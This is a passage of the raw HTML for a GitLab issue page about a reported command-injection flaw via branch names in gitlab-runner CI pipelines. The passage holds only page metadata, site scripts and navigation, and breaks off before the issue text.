





<!DOCTYPE html>
<html class="gl-light ui-neutral with-top-bar with-header " lang="en">
<head prefix="og: http://ogp.me/ns#">
<meta charset="utf-8">
<meta content="IE=edge" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1" name="viewport">
<title>Command injection via branch name in CI pipelines. (#27386) · Issues · GitLab.org / gitlab-runner · GitLab</title>
<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
window.gon={};gon.math_rendering_limits_enabled=true;gon.features={"preserveMarkdown":true,"issuesGridView":false,"serviceDeskTicket":false,"issuesListDrawer":false,"notificationsTodosButtons":false,"glqlIntegration":true,"workItemsBeta":true,"workItemsAlpha":false,"workItems":true,"epicWidgetEditConfirmation":false,"namespaceLevelWorkItems":false,"workItemsViewPreference":false,"okrsMvc":false,"workItemEpics":true};gon.licensed_features={"escalationPolicies":true,"okrs":true};gon.abilities={"summarizeComments":false,"measureCommentTemperature":false};
//]]>
</script>


<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
var gl = window.gl || {};
gl.startup_calls = {"/gitlab-org/gitlab-runner/-/issues/27386/related_branches":{},"/gitlab-org/gitlab-runner/-/issues/27386/discussions.json?per_page=20":{},"/gitlab-org/gitlab-runner/-/issues/27386.json?serializer=sidebar_extras":{}};
gl.startup_graphql_calls = [{"query":"query getDesignList($fullPath: ID!, $iid: String!, $atVersion: DesignManagementVersionID) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      designCollection {\n        __typename\n        copyState\n        designs(atVersion: $atVersion) {\n          __typename\n          nodes {\n            __typename\n            id\n            event\n            filename\n            notesCount\n            image\n            imageV432x230\n            currentUserTodos(state: pending) {\n              __typename\n              nodes {\n                __typename\n                id\n              }\n            }\n          }\n        }\n        versions {\n          __typename\n          nodes {\n            __typename\n            id\n            sha\n            createdAt\n            author {\n              __typename\n              id\n              name\n              avatarUrl\n            }\n          }\n        }\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab-runner","iid":"27386","atVersion":null}},{"query":"query permissions($fullPath: ID!, $iid: String!) {\n  project(fullPath: $fullPath) {\n    __typename\n    id\n    issue(iid: $iid) {\n      __typename\n      id\n      userPermissions {\n        __typename\n        createDesign\n      }\n    }\n  }\n}\n","variables":{"fullPath":"gitlab-org/gitlab-runner","iid":"27386"}}];

if (gl.startup_calls && window.fetch) {
  Object.keys(gl.startup_calls).forEach(apiCall => {
   gl.startup_calls[apiCall] = {
      fetchCall: fetch(apiCall, {
        // Emulate XHR for Rails AJAX request checks
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        // fetch won’t send cookies in older browsers, unless you set the credentials init option.
        // We set to `same-origin` which is default value in modern browsers.
        // See https://github.com/whatwg/fetch/pull/585 for more information.
        credentials: 'same-origin'
      })
    };
  });
}
if (gl.startup_graphql_calls && window.fetch) {
  const headers = {"X-CSRF-Token":"9bnKl8eof8dHwqz43PnQwzX_iscC0qFyGr1fOzfUjqoh_YWZ_Sd2DOzsJb5nF9xmQxGv20ZOloYap4STteT3jw","x-gitlab-feature-category":"team_planning"};
  const url = `https://gitlab.com/api/graphql`

  const opts = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      ...headers,
    }
  };

  gl.startup_graphql_calls = gl.startup_graphql_calls.map(call => ({
    ...call,
    fetchCall: fetch(url, {
      ...opts,
      credentials: 'same-origin',
      body: JSON.stringify(call)
    })
  }))
}


//]]>
</script>



<link rel="stylesheet" href="/assets/application-9de688b302d723d15d70ba51a5410625092e3bc978dbb160cc523f86c4807968.css" />
<link rel="stylesheet" href="/assets/page_bundles/design_management-f20ae9b5b8c9a0f793e3ffa2ddc13953bfd683e1d351c8e6cc75e0fcd4ddde90.css" /><link rel="stylesheet" href="/assets/page_bundles/incidents-b9f383aefa56f0a72990496e4a4b3aaf2c525843283a1c0c3d85876537187397.css" /><link rel="stylesheet" href="/assets/page_bundles/issuable-e25480d2326300d5c49ad31dbd847a53e39fc33a5fd595a961dd7238e411b558.css" /><link rel="stylesheet" href="/assets/page_bundles/notes_shared-7e727ab1e91b421915feadeb04a1b9d57213cb1b2f8f56f4d894b34d6b42e9b3.css" /><link rel="stylesheet" href="/assets/page_bundles/issues_show-785541c300108b8ecf7c08fd02bd67f4d6b9d59c86918ecfbf91bae5e1c8ffa8.css" /><link rel="stylesheet" href="/assets/page_bundles/work_items-22a76cdd1fe2ae5431b7ff603f86212acaf81b49c4a932f19e3b3222dc1881ee.css" /><link rel="stylesheet" href="/assets/page_bundles/labels-3508460b8d6f839e9d60de1f2065fdaf7f057efab04cf71966acef6a86fe9b41.css" /><link rel="stylesheet" href="/assets/page_bundles/commit_description-1e2cba4dda3c7b30dd84924809020c569f1308dea51520fe1dd5d4ce31403195.css" />
<link rel="stylesheet" href="/assets/application_utilities-73b9a1c83703ccfccd0e1e418c7d8dc606fcac533fa38b9fa86792f098db0f9a.css" />
<link rel="stylesheet" href="/assets/tailwind-284f33824923c600abd24d7884ff853fd38734b17a1441a1b7e31d4aa365acc2.css" />


<link rel="stylesheet" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" />
<link rel="stylesheet" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" />

<script src="/assets/webpack/runtime.f0860ff2.bundle.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/main.78bd52ff.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/tracker.868aa839.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/analytics.cb60a77a.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
window.snowplowOptions = {"namespace":"gl","hostname":"snowplowprd.trx.gitlab.net","cookieDomain":".gitlab.com","appId":"gitlab","formTracking":true,"linkClickTracking":true}

gl = window.gl || {};
gl.snowplowStandardContext = {"schema":"iglu:com.gitlab/gitlab_standard/jsonschema/1-1-1","data":{"environment":"production","source":"gitlab-rails","correlation_id":"01JGVQCAA8CEWA9B9R353CRNQR","plan":"gold","extra":{},"user_id":null,"global_user_id":null,"is_gitlab_team_member":null,"namespace_id":9970,"project_id":250833,"feature_enabled_by_namespace_ids":null,"realm":"saas","instance_id":"ea8bf810-1d6f-4a6a-b4fd-93e8cbd8b57f","host_name":"gitlab-cny-webservice-web-7b99886bd6-5dpkw","instance_version":"17.8.0","context_generated_at":"2025-01-05T17:14:38.569Z"}}
gl.snowplowPseudonymizedPageUrl = "https://gitlab.com/namespace9970/project250833/-/issues/27386";
gl.maskedDefaultReferrerUrl = null;
gl.ga4MeasurementId = 'G-ENFH3X7M5Y';


//]]>
</script>
<link rel="preload" href="/assets/application_utilities-73b9a1c83703ccfccd0e1e418c7d8dc606fcac533fa38b9fa86792f098db0f9a.css" as="style" type="text/css" nonce="2ylfba2ZzNOl+2mGykKlow==">
<link rel="preload" href="/assets/application-9de688b302d723d15d70ba51a5410625092e3bc978dbb160cc523f86c4807968.css" as="style" type="text/css" nonce="2ylfba2ZzNOl+2mGykKlow==">
<link rel="preload" href="/assets/highlight/themes/white-e31d355458ead69f8798dbb62f54c60c4ccc7db35289cbbd2353ddfdf5109aac.css" as="style" type="text/css" nonce="2ylfba2ZzNOl+2mGykKlow==">
<link crossorigin="" href="https://snowplowprd.trx.gitlab.net" rel="preconnect">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-1e0a5107ea3bbd4be93e8ad2c503467e43166cd37e4293570b490e0812ede98b.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-sans/GitLabSans-Italic-38eaf1a569a54ab28c58b92a4a8de3afb96b6ebc250cf372003a7b38151848cc.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-08d2c5e8ff8fd3d2d6ec55bc7713380f8981c35f9d2df14e12b835464d6e8f23.woff2" rel="preload">
<link as="font" crossorigin="" href="/assets/gitlab-mono/GitLabMono-Italic-38e58d8df29485a20c550da1d0111e2c2169f6dcbcf894f2cd3afbdd97bcc588.woff2" rel="preload">
<link rel="preload" href="/assets/fonts-fae5d3f79948bd85f18b6513a025f863b19636e85b09a1492907eb4b1bb0557b.css" as="style" type="text/css" nonce="2ylfba2ZzNOl+2mGykKlow==">



<script src="/assets/webpack/sentry.907cf3e4.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>

<script src="/assets/webpack/9.49e5c3e3.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/11.e2e145a2.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/13.3d62f21f.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/commons-pages.groups.analytics.dashboards-pages.groups.harbor.repositories-pages.groups.iteration_ca-b07ae190.ba6536d6.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/commons-pages.groups.new-pages.import.gitlab_projects.new-pages.import.manifest.new-pages.projects.n-44c6c18e.3be560a5.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/commons-pages.search.show-super_sidebar.ca4ee38a.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/super_sidebar.14e23139.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/commons-pages.projects-pages.projects.activity-pages.projects.alert_management.details-pages.project-bce54798.cf2cb6b5.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>
<script src="/assets/webpack/pages.projects.issues.show.779fd13b.chunk.js" defer="defer" nonce="fvcHCvwWdzQcfbsOr86N7w=="></script>

<meta content="object" property="og:type">
<meta content="GitLab" property="og:site_name">
<meta content="Command injection via branch name in CI pipelines. (#27386) · Issues · GitLab.org / gitlab-runner · GitLab" property="og:title">
<meta content=" Status Report (revised: 2022-08-xx) {placeholder} HackerOne report #1063511 by stanlyoncm on..." property="og:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/250833/runner.png" property="og:image">
<meta content="64" property="og:image:width">
<meta content="64" property="og:image:height">
<meta content="https://gitlab.com/gitlab-org/gitlab-runner/-/issues/27386" property="og:url">
<meta content="summary" property="twitter:card">
<meta content="Command injection via branch name in CI pipelines. (#27386) · Issues · GitLab.org / gitlab-runner · GitLab" property="twitter:title">
<meta content=" Status Report (revised: 2022-08-xx) {placeholder} HackerOne report #1063511 by stanlyoncm on..." property="twitter:description">
<meta content="https://gitlab.com/uploads/-/system/project/avatar/250833/runner.png" property="twitter:image">
<meta property="twitter:label1" content="Author"><meta property="twitter:data1" content="GitLab SecurityBot"><meta property="twitter:label2" content="Assignee"><meta property="twitter:data2" content="Zeff Morgan, Georgi N. Georgiev, and Aleksandr Lyubenkov">
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="bHzERuHR5BqqjX1M51l0hE36fH2JvMtDSGbzECE5liu4OItI217t0QGj9Apct3ghOxRZYc0g_LdIfCi4ownvDg" />
<meta name="csp-nonce" content="fvcHCvwWdzQcfbsOr86N7w==" />
<meta name="action-cable-url" content="/-/cable" />
<link href="/-/manifest.json" rel="manifest">
<link rel="icon" type="image/png" href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" id="favicon" data-original-href="/assets/favicon-yellow-018213ceb87b472388095d0264be5b4319ef47471dacea03c83ecc233ced2fd5.png" />
<link rel="apple-touch-icon" type="image/x-icon" href="/assets/apple-touch-icon-b049d4bc0dd9626f31db825d61880737befc7835982586d015bded10b4435460.png" />
<link href="/search/opensearch.xml" rel="search" title="Search GitLab" type="application/opensearchdescription+xml">




<meta content=" Status Report (revised: 2022-08-xx) {placeholder} HackerOne report #1063511 by stanlyoncm on..." name="description">
<meta content="#ececef" name="theme-color">
</head>

<body class="tab-width-8 gl-browser-chrome gl-platform-windows" data-group="gitlab-org" data-group-full-path="gitlab-org" data-namespace-id="9970" data-page="projects:issues:show" data-page-type-id="27386" data-project="gitlab-runner" data-project-full-path="gitlab-org/gitlab-runner" data-project-id="250833">
<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
gl = window.gl || {};
gl.GfmAutoComplete = gl.GfmAutoComplete || {};
gl.GfmAutoComplete.dataSources = {"epics":"/gitlab-org/gitlab-runner/-/autocomplete_sources/epics","iterations":"/gitlab-org/gitlab-runner/-/autocomplete_sources/iterations","vulnerabilities":"/gitlab-org/gitlab-runner/-/autocomplete_sources/vulnerabilities","members":"/gitlab-org/gitlab-runner/-/autocomplete_sources/members?type=Issue\u0026type_id=27386","issues":"/gitlab-org/gitlab-runner/-/autocomplete_sources/issues","mergeRequests":"/gitlab-org/gitlab-runner/-/autocomplete_sources/merge_requests","labels":"/gitlab-org/gitlab-runner/-/autocomplete_sources/labels?type=Issue\u0026type_id=27386","milestones":"/gitlab-org/gitlab-runner/-/autocomplete_sources/milestones","commands":"/gitlab-org/gitlab-runner/-/autocomplete_sources/commands?type=Issue\u0026type_id=27386","snippets":"/gitlab-org/gitlab-runner/-/autocomplete_sources/snippets","contacts":"/gitlab-org/gitlab-runner/-/autocomplete_sources/contacts?type=Issue\u0026type_id=27386","wikis":null};


//]]>
</script>
<script nonce="fvcHCvwWdzQcfbsOr86N7w==">
//<![CDATA[
gl = window.gl || {};
gl.client = {"isChrome":true,"isWindows":true};


//]]>
</script>


<header class="header-logged-out" data-testid="navbar">
<a class="gl-sr-only gl-accessibility" href="#content-body">Skip to content</a>
<div class="container-fluid">
<nav aria-label="Explore GitLab" class="header-logged-out-nav gl-flex gl-gap-3 gl-justify-between">
<div class="gl-flex gl-items-center gl-gap-1">
<span class="gl-sr-only">GitLab</span>
<a title="Homepage" id="logo" class="header-logged-out-logo has-tooltip" aria-label="Homepage" data-track-label="main_navigation" data-track-action="click_gitlab_logo_link" data-track-property="navigation_top" href="/"><svg aria-hidden="true" role="img" class="tanuki-logo" width="25" height="24" viewBox="0 0 25 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path class="tanuki-shape tanuki" d="m24.507 9.5-.034-.09L21.082.562a.896.896 0 0 0-1.694.091l-2.29 7.01H7.825L5.535.653a.898.898 0 0 0-1.694-.09L.451 9.411.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 2.56 1.935 1.554 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#E24329"/>
  <path class="tanuki-shape right-cheek" d="m24.507 9.5-.034-.09a11.44 11.44 0 0 0-4.56 2.051l-7.447 5.632 4.742 3.584 5.197-3.89.014-.01A6.297 6.297 0 0 0 24.507 9.5Z"
        fill="#FC6D26"/>
  <path class="tanuki-shape chin" d="m7.707 20.677 2.56 1.935 1.555 1.176a1.051 1.051 0 0 0 1.268 0l1.555-1.176 2.56-1.935-4.743-3.584-4.755 3.584Z"
        fill="#FCA326"/>
  <path class="tanuki-shape left-cheek" d="M5.01 11.461a11.43 11.43 0 0 0-4.56-2.05L.416 9.5a6.297 6.297 0 0 0 2.09 7.278l.012.01.03.022 5.16 3.867 4.745-3.584-7.444-5.632Z"
        fill="#FC6D26"/>
</svg>

</a><a class="gl-badge badge badge-pill badge-success canary-badge" data-testid="canary_badge_link" href="https://next.gitlab.com" rel="noopener noreferrer" target="_blank"><span class="gl-badge-content">Next
</span></a></div>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-grow">
<li class="header-logged-out-nav-item header-logged-out-dropdown md:gl-hidden">
<button class="header-logged-out-toggle" data-toggle="dropdown" type="button">
<span class="gl-sr-only">
Menu
</span>
<svg class="s16" data-testid="hamburger-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#hamburger"></use></svg>
</button>
<div class="dropdown-menu">
<ul>
<li>
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li>
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li>
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li>
<a href="/explore">Explore</a>
</li>
</ul>
</div>
</li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/why-gitlab">Why GitLab
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a href="https://about.gitlab.com/pricing">Pricing
</a></li>
<li class="header-logged-out-nav-item gl-hidden gl-inline-block">
<a href="https://about.gitlab.com/sales">Contact Sales
</a></li>
<li class="header-logged-out-nav-item gl-hidden md:gl-inline-block">
<a class="" href="/explore">Explore</a>
</li>
</ul>
<ul class="gl-list-none gl-p-0 gl-m-0 gl-flex gl-gap-3 gl-items-center gl-justify-end">
<li class="header-logged-out-nav-item">
<a href="/users/sign_in?redirect_to_referer=yes">Sign in</a>
</li>
<li class="header-logged-out-nav-item">
<a class="gl-button btn btn-md btn-confirm !gl-inline-flex" href="/users/sign_up"><span class="gl-button-text">
Get free trial

</span>

</a></li>
</ul>
</nav>
</div>
</header>

<div class="layout-page page-gutter right-sidebar-expanded page-with-super-sidebar">
<aside class="js-super-sidebar super-sidebar super-sidebar-loading" data-command-palette="{&quot;project_files_url&quot;:&quot;/gitlab-org/gitlab-runner/-/files/main?format=json&quot;,&quot;project_blob_url&quot;:&quot;/gitlab-org/gitlab-runner/-/blob/main&quot;}" data-force-desktop-expanded-sidebar="" data-is-saas="true" data-root-path="/" data-sidebar="{&quot;whats_new_most_recent_release_items_count&quot;:6,&quot;whats_new_version_digest&quot;:&quot;c955dbe1b30a1468b032fe6896086eda50f884ff9559d966e5ef75c34eee3ff0&quot;,&quot;is_logged_in&quot;:false,&quot;context_switcher_links&quot;:[{&quot;title&quot;:&quot;Explore&quot;,&quot;link&quot;:&quot;/explore&quot;,&quot;icon&quot;:&quot;compass&quot;}],&quot;current_menu_items&quot;:[{&quot;id&quot;:&quot;project_overview&quot;,&quot;title&quot;:&quot;gitlab-runner&quot;,&quot;avatar&quot;:&quot;/uploads/-/system/project/avatar/250833/runner.png&quot;,&quot;entity_id&quot;:250833,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner&quot;,&quot;link_classes&quot;:&quot;shortcuts-project&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;manage_menu&quot;,&quot;title&quot;:&quot;Manage&quot;,&quot;icon&quot;:&quot;users&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/activity&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;activity&quot;,&quot;title&quot;:&quot;Activity&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/activity&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-activity&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;members&quot;,&quot;title&quot;:&quot;Members&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/project_members&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;labels&quot;,&quot;title&quot;:&quot;Labels&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/labels&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;plan_menu&quot;,&quot;title&quot;:&quot;Plan&quot;,&quot;icon&quot;:&quot;planning&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/issues&quot;,&quot;is_active&quot;:true,&quot;items&quot;:[{&quot;id&quot;:&quot;project_issue_list&quot;,&quot;title&quot;:&quot;Issues&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/issues&quot;,&quot;pill_count_field&quot;:&quot;openIssuesCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-issues has-sub-items&quot;,&quot;is_active&quot;:true},{&quot;id&quot;:&quot;boards&quot;,&quot;title&quot;:&quot;Issue boards&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/boards&quot;,&quot;link_classes&quot;:&quot;shortcuts-issue-boards&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;milestones&quot;,&quot;title&quot;:&quot;Milestones&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/milestones&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;iterations&quot;,&quot;title&quot;:&quot;Iterations&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/cadences&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;requirements&quot;,&quot;title&quot;:&quot;Requirements&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/requirements_management/requirements&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;code_menu&quot;,&quot;title&quot;:&quot;Code&quot;,&quot;icon&quot;:&quot;code&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/merge_requests&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;project_merge_request_list&quot;,&quot;title&quot;:&quot;Merge requests&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/merge_requests&quot;,&quot;pill_count_field&quot;:&quot;openMergeRequestsCount&quot;,&quot;link_classes&quot;:&quot;shortcuts-merge_requests&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;files&quot;,&quot;title&quot;:&quot;Repository&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/tree/main&quot;,&quot;link_classes&quot;:&quot;shortcuts-tree&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;branches&quot;,&quot;title&quot;:&quot;Branches&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/branches&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;commits&quot;,&quot;title&quot;:&quot;Commits&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/commits/main?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-commits&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;tags&quot;,&quot;title&quot;:&quot;Tags&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/tags&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;graphs&quot;,&quot;title&quot;:&quot;Repository graph&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/network/main?ref_type=heads&quot;,&quot;link_classes&quot;:&quot;shortcuts-network&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;compare&quot;,&quot;title&quot;:&quot;Compare revisions&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/compare?from=main\u0026to=main&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;file_locks&quot;,&quot;title&quot;:&quot;Locked files&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/path_locks&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;build_menu&quot;,&quot;title&quot;:&quot;Build&quot;,&quot;icon&quot;:&quot;rocket&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/pipelines&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;pipelines&quot;,&quot;title&quot;:&quot;Pipelines&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/pipelines&quot;,&quot;link_classes&quot;:&quot;shortcuts-pipelines&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;jobs&quot;,&quot;title&quot;:&quot;Jobs&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/jobs&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;pipeline_schedules&quot;,&quot;title&quot;:&quot;Pipeline schedules&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/pipeline_schedules&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;test_cases&quot;,&quot;title&quot;:&quot;Test cases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/quality/test_cases&quot;,&quot;link_classes&quot;:&quot;shortcuts-test-cases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;artifacts&quot;,&quot;title&quot;:&quot;Artifacts&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/artifacts&quot;,&quot;link_classes&quot;:&quot;shortcuts-builds&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;deploy_menu&quot;,&quot;title&quot;:&quot;Deploy&quot;,&quot;icon&quot;:&quot;deployments&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/releases&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;releases&quot;,&quot;title&quot;:&quot;Releases&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/releases&quot;,&quot;link_classes&quot;:&quot;shortcuts-deployments-releases&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;container_registry&quot;,&quot;title&quot;:&quot;Container Registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/container_registry&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_registry&quot;,&quot;title&quot;:&quot;Model registry&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/ml/models&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;operations_menu&quot;,&quot;title&quot;:&quot;Operate&quot;,&quot;icon&quot;:&quot;cloud-pod&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/environments&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;environments&quot;,&quot;title&quot;:&quot;Environments&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/environments&quot;,&quot;link_classes&quot;:&quot;shortcuts-environments&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;monitor_menu&quot;,&quot;title&quot;:&quot;Monitor&quot;,&quot;icon&quot;:&quot;monitor&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/incidents&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;incidents&quot;,&quot;title&quot;:&quot;Incidents&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/incidents&quot;,&quot;is_active&quot;:false}],&quot;separated&quot;:false},{&quot;id&quot;:&quot;analyze_menu&quot;,&quot;title&quot;:&quot;Analyze&quot;,&quot;icon&quot;:&quot;chart&quot;,&quot;avatar_shape&quot;:&quot;rect&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/value_stream_analytics&quot;,&quot;is_active&quot;:false,&quot;items&quot;:[{&quot;id&quot;:&quot;cycle_analytics&quot;,&quot;title&quot;:&quot;Value stream analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/value_stream_analytics&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-cycle-analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;contributors&quot;,&quot;title&quot;:&quot;Contributor analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/graphs/main?ref_type=heads&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;ci_cd_analytics&quot;,&quot;title&quot;:&quot;CI/CD analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/pipelines/charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;repository_analytics&quot;,&quot;title&quot;:&quot;Repository analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/graphs/main/charts&quot;,&quot;link_classes&quot;:&quot;shortcuts-repository-charts&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;code_review&quot;,&quot;title&quot;:&quot;Code review analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/analytics/code_reviews&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;issues&quot;,&quot;title&quot;:&quot;Issue analytics&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/-/analytics/issues_analytics&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;insights&quot;,&quot;title&quot;:&quot;Insights&quot;,&quot;link&quot;:&quot;/gitlab-org/gitlab-runner/insights/&quot;,&quot;link_classes&quot;:&quot;shortcuts-project-insights&quot;,&quot;is_active&quot;:false},{&quot;id&quot;:&quot;model_experiments&quot;,&quot;title&quot;:&quot;Model 